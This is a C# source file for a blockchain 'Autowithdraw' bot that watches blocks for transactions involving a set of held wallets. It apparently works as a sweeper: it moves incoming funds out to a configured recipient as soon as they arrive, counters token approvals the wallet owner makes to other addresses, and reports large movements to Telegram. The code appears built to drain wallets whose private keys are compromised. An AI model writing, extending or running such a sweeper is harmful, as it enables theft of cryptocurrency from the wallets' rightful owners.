using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Main.Actions;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.Client;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Main.Handlers
{
    internal class Block
    {
        public static Dictionary<int, long> BlocksWork = new Dictionary<int, long>();
        public Web3 W3;
        public int ChainID;
        public Block(int id)
        {
            W3 = Settings.Chains[id].Web3;
            ChainID = id;
        }

        public async Task Starter()
        {
            try
            {
                BigInteger LastBlock = (await W3.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value - 3;

                while (true)
                {
                    try
                    {
                        BigInteger BlockNumber = LastBlock + 1;

                        var Block = await W3.Eth.Blocks.GetBlockWithTransactionsByNumber.SendRequestAsync(
                                new HexBigInteger(BlockNumber)) ?? throw new Exception("Null");

                        LastBlock = BlockNumber;

                        if (Block.Number.Value % 50 == 0 || (Block.Number.Value % 25 == 0 && ChainID == 1))
                            new Thread(() => Logger.DebugNewBlock(Block.Number.Value, Block.Timestamp.Value, ChainID)).Start();

                        if (DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds -
                            Cast.GetInt(Block.Timestamp.Value) > 3600) continue;

                        if (Block.TransactionCount() == 0) throw new Exception("Null");
                        int Count = Block.TransactionCount() <= 40 ? 1 : 40;

                        foreach (Transaction[] transactions in Helper.Chunk(Block.Transactions.Reverse().ToArray(), Count))
                        {
                            await Task.Factory.StartNew(() => CheckTXs(transactions));
                        }
                        BlocksWork[ChainID] = (long)Block.Timestamp.Value;
                    }
                    catch (Nethereum.JsonRpc.Client.RpcClientUnknownException e)
                    {
                        Logger.Debug($"[Blocks] {Settings.Chains[ChainID].API}:{Settings.Config.Chains[ChainID].HttpPort} {e.Message}", ConsoleColor.Red);
                    }
                    catch (Nethereum.JsonRpc.Client.RpcClientTimeoutException)
                    {
                        Logger.Debug($"[Blocks] {Settings.Chains[ChainID].API}:{Settings.Config.Chains[ChainID].HttpPort} not responding", ConsoleColor.Red);
                    }
                    catch (Exception e)
                    {
                        if (e.Message != "Null" && !e.Message.Contains("unfinalized"))
                            Logger.Error("[Blocks] " + e.Message);
                    }

                    Thread.Sleep(50);
                }
            }
            catch (Exception e) { Logger.Error($"{Settings.Chains[ChainID].API}:{Settings.Config.Chains[ChainID].HttpPort} {e.Message}"); }
        }

        public async Task CheckTXs(Transaction[] transactions)
        {
            foreach (Transaction Transaction in transactions)
            {
                try
                {
                    if (Transaction == null || Transaction.To == null)
                        continue;

                    #region Values

                    string txHash = Transaction.TransactionHash;
                    string Address_From = Web3.ToChecksumAddress(Transaction.From);
                    string Address_To = Web3.ToChecksumAddress(Transaction.To);
                    string ContractAddress = Address_To;
                    string Input = Transaction.Input;
                    float Ether = (float)Web3.Convert.FromWei(Transaction.Value);
                    string Link = Settings.Chains[ChainID].Link;
                    float Price = Pricing.GetPrice(Transaction.Value, ChainID);

                    #endregion

                    try
                    {
                        if (Address_To == Settings.Config.Recipient || Settings.Chains[ChainID].Contract.ContractAddress == ContractAddress)
                            return;
                    }
                    catch
                    {
                        // ignored
                    }

                    if (Transaction.Value != new HexBigInteger(0) && Address_From != Settings.Chains[ChainID].Contract.Sponsor)
                    {
                        #region Transfers In
                        if (Settings.Wallets.ContainsKey(Address_To))
                        {
                            if (Price >= 50)
                            {
                               // if (!Settings.EXLS)
                                    await Network.SendTelegram(
                                        $"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{txHash}\">New {Settings.Chains[ChainID].Token}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address_To}\">{Address_To}</a>\nAmount: {Ether} {Settings.Chains[ChainID].Token} ({Price}$)",
                                        isNative: true,
                                        isTransaction: true);
                            }

                            if ((Price >= 3 || ChainID != 1) &&
                                !Transfer.Busy.Contains(Address_To) && !Settings.Config.Other.StoppedAW)
                            {
                                //Transfer.Busy.Add(Address_To); // Анти спам
                                if (Price >= 6)
                                    Logger.Debug($"{Address_To} {Ether} - {Price}$", ConsoleColor.DarkGray);
                                await Task.Factory.StartNew(() => Transfer.Native(Address_To, Transaction.Value.Value, ChainID));
                            }
                        }

                        #endregion

                        #region Transfers Out

                        if (Settings.Wallets.ContainsKey(Address_From) &&
                            Address_To != Settings.Config.Recipient &&
                            Price >= 50)
                        {
                                await Network.SendTelegram(
                                    $"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{txHash}\">Out {Settings.Chains[ChainID].Token}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address_From}\">{Address_From}</a>\nTo: <a href=\"https://{Link}/address/{Address_To}\">{Address_To}</a>\nAmount: {Ether} {Settings.Chains[ChainID].Token} ({Price}$)",
                                    isNative: true,
                                    isTransaction: true);
                        }

                        #endregion
                    }

                    #region AutoApprove

                    if (!Settings.Config.Other.ScamTokens.Contains(ContractAddress) && Input.StartsWith("0x095ea7b3") && Settings.Wallets.ContainsKey(Address_From))
                    {
                        Address_To = Cast.ParseAddress(Input);
                        BigInteger Wei = Cast.ParseWei(Input);

                        if (ChainID != 1 && ((Address_To == Settings.Config.Proxy.Address && Wei <= Settings.MinInt && Wei != -1) || (Address_To != Settings.Config.Recipient && Address_To != Settings.Config.Proxy.Address && (Wei > Settings.MinInt || Wei == -1))))
                        {
                            await Task.Factory.StartNew(() => AutoApprove.Starter(Address_From, ContractAddress, ChainID));
                        }

                        if (Address_To == Settings.Config.Proxy.Address && Wei <= Settings.MinInt && Wei != -1)
                        {
                            string Symbol = await new ContractHelper(Address_From, ContractAddress, Settings.Chains[ChainID].Web3).Symbol();
                        }

                        await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 2, Address_From, ChainID, txHash, fromApprove: true));
                    }

                    #endregion

                    else if (!Input.StartsWith("0xfb48d48a"))
                        await Parse.Transaction(Transaction.TransactionHash, ChainID);

                    #region Internal

                    if ((Transaction.Value.Value == 0 || Price >= 3) && !Input.StartsWith("0x23b872dd") && !Input.StartsWith("0xa9059cbb") && !Input.StartsWith("0x095ea7b3") && !Settings.Config.Other.ScamTokens.Contains(ContractAddress))
                        await Task.Factory.StartNew(() => Helper.Internal(Input, ContractAddress, ChainID));

                    #endregion
                }
                catch
                {
                    // ignored
                }
            }
        }
    }
}
